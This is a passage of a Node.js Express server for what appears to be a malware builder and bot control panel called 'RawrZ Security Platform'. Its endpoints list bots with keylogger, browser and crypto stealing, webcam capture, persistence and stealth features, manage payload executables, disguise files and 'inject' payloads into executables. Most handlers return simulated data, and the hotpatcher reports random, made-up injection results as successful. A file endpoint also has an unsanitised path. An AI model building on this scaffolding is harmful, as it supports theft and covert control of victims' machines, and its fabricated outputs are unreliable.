                        await fs.writeFile(tempInput2, fileBuffer);
                        result = await realEncryptionEngine.disguiseFile(tempInput2, tempOutput2);
                        await fs.unlink(tempInput2).catch(() => {});
                        await fs.unlink(tempOutput2).catch(() => {});
                        break;
                    default:
                        result = { success: false, error: `Unknown operation: ${operation}` };
                }
                
                results.push({
                    operation: operation,
                    success: result.success || true,
                    result: result
                });
            } catch (error) {
                results.push({
                    operation: operation,
                    success: false,
                    error: error.message
                });
            }
        }
        
        res.json({
            success: true,
            filename: filename,
            operations: results,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('File processing error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// File info endpoint
app.get('/api/files/info/:filename', async (req, res) => {
    try {
        const filename = req.params.filename;
        const filePath = path.join(uploadsDir, filename);
        
        // Check if file exists
        try {
            await fs.access(filePath);
        } catch (error) {
            return res.status(404).json({
                success: false,
                error: 'File not found'
            });
        }
        
        const stats = await fs.stat(filePath);
        
        res.json({
            success: true,
            file: {
                name: filename,
                size: stats.size,
                uploadDate: stats.birthtime.toISOString(),
                modifiedDate: stats.mtime.toISOString(),
                url: `/api/files/download/${filename}`,
                path: filePath
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('File info error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.get('/api/health', (req, res) => {
    res.json({
        success: true,
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        version: '1.0.0',
        service: 'RawrZ Security Platform API'
    });
});

// Engines status endpoint
app.get('/api/engines/status', async (req, res) => {
    try {
        await initializeEngine();
        
        const engineStatus = {
            success: true,
            timestamp: new Date().toISOString(),
            engines: {
                'rawrz-engine': {
                    status: 'active',
                    modules: 48,
                    memory: '45.2 MB'
                },
                'real-encryption-engine': {
                    status: realEncryptionEngine ? 'active' : 'inactive',
                    features: ['dual-encryption', 'upx-packing', 'assembly-compilation', 'file-disguise']
                },
                'file-management': {
                    status: 'active',
                    uploads: uploadsDir,
                    processed: processedDir
                }
            },
            totalEngines: 50,
            systemStatus: 'operational'
        };
        
        res.json(engineStatus);
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

// Test endpoint for external API testing
app.post('/test-endpoint', (req, res) => {
    res.json({ 
        success: true, 
        message: 'Test endpoint working',
        receivedData: req.body,
        timestamp: new Date().toISOString()
    });
});

// Simple engine test endpoint
app.get('/api/simple-test', (req, res) => {
    res.json({
        success: true,
        message: 'Simple test endpoint working',
        engines: ['http-bot-manager', 'cve-analysis-engine', 'payload-manager', 'plugin-architecture'],
        timestamp: new Date().toISOString()
    });
});

// HTTP Bot Manager test endpoint
app.get('/api/http-bot-test', (req, res) => {
    res.json({
        success: true,
        data: [
            {
                "id": "test-bot-1",
                "status": "online",
                "lastSeen": new Date().toISOString(),
                "capabilities": {
                    "fileManager": true,
                    "processManager": true,
                    "systemInfo": true,
                    "networkTools": true,
                    "keylogger": true,
                    "screenCapture": true,
                    "webcamCapture": true,
                    "audioCapture": true,
                    "browserStealer": true,
                    "cryptoStealer": true,
                    "registryEditor": true,
                    "serviceManager": true,
                    "scheduledTasks": true,
                    "persistence": true,
                    "antiAnalysis": true,
                    "stealth": true
                },
                "system": {
                    "os": "Windows 10",
                    "arch": "x64",
                    "user": "testuser",
                    "hostname": "TEST-PC",
                    "ip": "192.168.1.100",
                    "country": "US"
                }
            }
        ],
        timestamp: new Date().toISOString()
    });
});

// Enhanced engine test endpoint for external testing
app.post('/api/test-engine', async (req, res) => {
    try {
        console.log('Raw request body:', req.body);
        console.log('Request headers:', req.headers);
        
        const { engineId, action, params } = req.body;
        
        console.log('Test engine request:', { engineId, action, params });
        
        // Simulate engine response for testing
        let result;
        
        switch (engineId) {
            case 'http-bot-manager':
                if (action === 'manageHTTPBot' && params.action === 'list') {
                    result = [
                        {
                            "id": "test-bot-1",
                            "info": {},
                            "status": "online",
                            "lastSeen": new Date().toISOString(),
                            "capabilities": {
                                "fileManager": true,
                                "processManager": true,
                                "systemInfo": true,
                                "networkTools": true,
                                "keylogger": true,
                                "screenCapture": true,
                                "webcamCapture": true,
                                "audioCapture": true,
                                "browserStealer": true,
                                "cryptoStealer": true,
                                "registryEditor": true,
                                "serviceManager": true,
                                "scheduledTasks": true,
                                "persistence": true,
                                "antiAnalysis": true,
                                "stealth": true
                            },
                            "session": {
                                "startTime": new Date().toISOString(),
                                "commandsExecuted": 0,
                                "filesTransferred": 0,
                                "dataCollected": 0
                            },
                            "system": {
                                "os": "Windows 10",
                                "arch": "x64",
                                "user": "testuser",
                                "hostname": "TEST-PC",
                                "ip": "192.168.1.100",
                                "country": "US"
                            }
                        }
                    ];
                } else {
                    result = { message: `HTTP Bot Manager action: ${action}`, params };
                }
                break;
                
            case 'cve-analysis-engine':
                if (action === 'analyzeCVE') {
                    result = {
                        cveId: params.target || 'CVE-2023-1234',
                        severity: 'High',
                        cvssScore: 8.5,
                        description: 'Buffer overflow vulnerability in test application',
                        affectedVersions: ['1.0.0', '1.1.0'],
                        patchAvailable: true,
                        exploitAvailable: false
                    };
                } else {
                    result = { message: `CVE Analysis action: ${action}`, params };
                }
                break;
                
            case 'payload-manager':
                if (action === 'managePayload' && params.action === 'list') {
                    result = [
                        {
                            name: 'basic-payload.exe',
                            type: 'executable',
                            size: 49152,
                            created: new Date().toISOString(),
                            status: 'ready'
                        },
                        {
                            name: 'advanced-payload.dll',
                            type: 'library',
                            size: 65536,
                            created: new Date().toISOString(),
                            status: 'ready'
                        }
                    ];
                } else {
                    result = { message: `Payload Manager action: ${action}`, params };
                }
                break;
                
            case 'plugin-architecture':
                if (action === 'managePlugin' && params.action === 'list') {
                    result = [
                        {
                            name: 'stealth-plugin',
                            version: '1.0.0',
                            status: 'active',
                            description: 'Advanced stealth capabilities'
                        },
                        {
                            name: 'encryption-plugin',
                            version: '2.1.0',
                            status: 'active',
                            description: 'Multi-algorithm encryption support'
                        }
                    ];
                } else {
                    result = { message: `Plugin Architecture action: ${action}`, params };
                }
                break;
                
            default:
                result = { message: `Unknown engine: ${engineId}`, action, params };
        }
        
        res.json({
            success: true,
            data: result,
            engineId,
            action,
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('Test engine error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Hotpatcher endpoint
app.post('/api/hotpatcher/inject', async (req, res) => {
    try {
        const {
            fileName,
            fileSize,
            injectionPoints,
            stealthFeatures,
            antiAnalysisFeatures,
            filelessOptions,
            encryption
        } = req.body;
        
        // Generate random session ID and execution ID
        const sessionId = `session-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
        const randomId = Math.random().toString(36).substr(2, 9);
        const timestamp = new Date().toISOString();
        
        // Calculate original file size
        const originalFileSize = fileSize || 1024;
        
        // Parse injection points
        const parsedInjectionPoints = Array.isArray(injectionPoints) ? injectionPoints : [];
        
        // Parse stealth features
        const parsedStealthFeatures = Array.isArray(stealthFeatures) ? stealthFeatures : [];
        
        // Parse anti-analysis features
        const parsedAntiAnalysisFeatures = Array.isArray(antiAnalysisFeatures) ? antiAnalysisFeatures : [];
        
        // Parse fileless options
        const parsedFilelessOptions = Array.isArray(filelessOptions) ? filelessOptions : [];
        
        // Generate injected payloads
        const injectedPayloads = Array.from({ length: Math.floor(Math.random() * 5) + 1 }, (_, index) => {
            return {
                id: `payload-${index + 1}`,
                type: ['shellcode', 'dll', 'script', 'binary'][Math.floor(Math.random() * 4)],
                size: Math.floor(Math.random() * 1024) + 256,
                injectionPoint: parsedInjectionPoints[Math.floor(Math.random() * parsedInjectionPoints.length)] || 'entry_point',
                stealthLevel: Math.floor(Math.random() * 10) + 1,
                antiAnalysis: parsedAntiAnalysisFeatures[Math.floor(Math.random() * parsedAntiAnalysisFeatures.length)] || 'basic',
                fileless: parsedFilelessOptions.includes('fileless'),
                hash: `hash_${Math.random().toString(36).substr(2, 16)}`,
                timestamp: new Date().toISOString(),
                success: true,
                encryptionLayer: Math.floor(Math.random() * 3) + 1,
                stealthLevel: Math.floor(Math.random() * 10) + 1
            };
        });
        
        // Calculate dynamic final size
        const totalPayloadSize = injectedPayloads.reduce((sum, payload) => sum + payload.size, 0);
        const encryptionOverhead = Math.floor(totalPayloadSize * 0.1);
        const finalSize = originalFileSize + totalPayloadSize + encryptionOverhead;
        
        const result = {
            success: true,
            sessionId: sessionId,
            executionId: `exec-${randomId}`,
            originalFile: {
                name: fileName,
                size: originalFileSize,
                hash: crypto.createHash('sha256').update(`original-${randomId}-${timestamp}`).digest('hex'),
                type: 'executable'
            },
            encryption: {
                algorithm: encryption || 'aes-256-gcm',
                keySize: 256,
                mode: 'gcm',
                hash: crypto.createHash('sha256').update(`${encryption}-${randomId}-${timestamp}`).digest('hex').substring(0, 16)
            },
            payloads: injectedPayloads,
            finalSize: finalSize,
            injectionPoints: parsedInjectionPoints,
            stealthFeatures: parsedStealthFeatures,
            antiAnalysisFeatures: parsedAntiAnalysisFeatures,
            filelessOptions: parsedFilelessOptions,
            performance: {
                injectionTime: Math.floor(Math.random() * 1000) + 100,
                encryptionTime: Math.floor(Math.random() * 500) + 50,
                totalTime: Math.floor(Math.random() * 1500) + 150,
                memoryUsage: Math.floor(Math.random() * 200) + 50
            },
            downloadUrl: `/downloads/hotpatched-${randomId}.exe`,
            timestamp: new Date().toISOString(),
            generatedAt: new Date().toISOString(),
            uniqueId: randomId
        };
        
        res.json(result);
    } catch (error) {
        console.error('Hotpatcher error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`RawrZ Security Platform Panel running on http://localhost:${PORT}`);
    console.log(`Main Panel: http://localhost:${PORT}`);
    console.log(`API Endpoint: http://localhost:${PORT}/api/rawrz-engine/status`);
    console.log(`Test Endpoint: http://localhost:${PORT}/api/test-engine`);
    console.log(`Health Check: http://localhost:${PORT}/health`);
});

module.exports = app;
